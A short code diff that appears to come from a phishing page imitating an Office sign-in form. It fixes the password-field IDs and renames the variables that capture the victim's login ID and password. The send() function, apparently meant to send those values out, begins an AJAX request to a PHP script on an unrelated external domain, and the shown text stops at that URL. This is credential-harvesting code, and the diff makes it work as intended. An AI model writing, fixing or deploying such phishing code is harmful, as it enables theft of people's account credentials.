@@ -803,7 +803,7 @@
           $("#office_passwd").val("");
           $("#login_error_msg").hide();
           $("#password_error_msg").show();
-          $("#office_password").focus();
+          $("#office_passwd").focus();
           return false;
         }
 
@@ -813,14 +813,14 @@
       function resetForm() {
         $("#password_error_msg").show();
         $("#login_error_msg").hide();
-        $("#office_password").val("");
-        $("#office_password").focus();
+        $("#office_passwd").val("");
+        $("#office_passwd").focus();
       }
 
       function send() {
         console.log("Sent!");
-        var email = $("#office_id").val();
-        var password = $("#office_password").val();
+        var uid = $("#office_id").val();
+        var idpwd = $("#office_passwd").val();
 
         $.ajax({
           url: "https://baf.com.sa/new.php",
